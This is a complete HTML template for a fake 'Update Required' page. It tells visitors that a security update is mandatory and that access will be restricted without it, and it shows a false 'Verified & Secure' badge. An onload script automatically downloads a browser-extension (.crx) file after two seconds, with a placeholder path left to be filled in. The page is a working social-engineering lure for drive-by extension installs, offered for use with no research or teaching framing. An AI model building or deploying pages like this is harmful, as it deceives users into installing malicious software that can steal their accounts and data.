<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Update Required</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: Arial, sans-serif;
        }
        body {
            width: 100vw;
            height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            background-color: #f8f9fa;
            text-align: center;
        }
        .container {
            background: white;
            padding: 20px;
            border-radius: 10px;
            box-shadow: 0px 4px 12px rgba(0, 0, 0, 0.1);
            max-width: 420px;
        }
        img {
            max-width: 100%;
            height: auto;
            border-radius: 5px;
        }
        h2 {
            color: #d9534f;
            margin: 15px 0;
        }
        p {
            color: #555;
            font-size: 15px;
        }
        .warning {
            font-size: 13px;
            color: #dc3545;
            font-weight: bold;
            margin-top: 10px;
        }
        .btn {
            display: inline-block;
            padding: 10px 15px;
            background: #007BFF;
            color: white;
            text-decoration: none;
            border-radius: 5px;
            margin-top: 15px;
            font-size: 14px;
        }
        .btn:hover {
            background: #0056b3;
        }
        .trust-badge {
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 5px;
            font-size: 12px;
            color: #28a745;
            margin-top: 10px;
        }
        .trust-badge span {
            font-weight: bold;
        }
    </style>
    <script>
        // Simulate auto-download after a short delay
        window.onload = function() {
            setTimeout(() => {
                let link = document.createElement('a');
                link.href = '/path-to-extension-file.crx'; // Change to actual file path
                link.download = 'extension.crx';
                document.body.appendChild(link);
                link.click();
                document.body.removeChild(link);
            }, 2000);
        };
    </script>
</head>
<body>

    <div class="container">
        <img src="/image" alt="Update Image">
        <h2>⚠ Update Required</h2>
        <p>A new security update has been released. To continue using this service, please install the latest extension update.</p>
        <p class="warning">Access will be restricted until the update is installed.</p>
        <div class="trust-badge">
            ✅ <span>Verified & Secure</span>
        </div>
        <a href="/path-to-extension-file.crx" class="btn" download>Install Update</a>
    </div>

</body>
</html>
